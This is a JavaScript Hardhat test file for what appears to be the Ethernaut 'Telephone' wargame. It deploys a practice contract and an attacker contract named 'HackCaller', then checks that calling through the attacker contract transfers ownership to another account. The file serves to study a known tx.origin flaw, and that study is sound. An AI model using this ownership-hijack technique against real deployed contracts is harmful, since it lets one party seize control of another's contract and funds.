const { expect } = require("chai");

describe("Telephone", function () {

    let Telephone;
    let telephone;
    let HackCaller;
    let hackCaller;


    before(async function () {
        const [owner, otherAccount] = await ethers.getSigners();

        Telephone = await ethers.getContractFactory("Telephone");
        telephone = await Telephone.deploy();

        HackCaller = await ethers.getContractFactory("HackCaller");
        hackCaller = await HackCaller.deploy(telephone.address);
    });

    it("hack contract by hijacking logic", async function() {
        const [owner, otherAccount] = await ethers.getSigners();

        console.log("old owner", await telephone.connect(otherAccount).owner())
        console.log("caller origin",otherAccount.address)
        await hackCaller.connect(otherAccount).update();

        const updatedOwner = await telephone.connect(otherAccount).owner();
        console.log("updated owner now", updatedOwner)
        expect(otherAccount.address == updatedOwner);
    });

})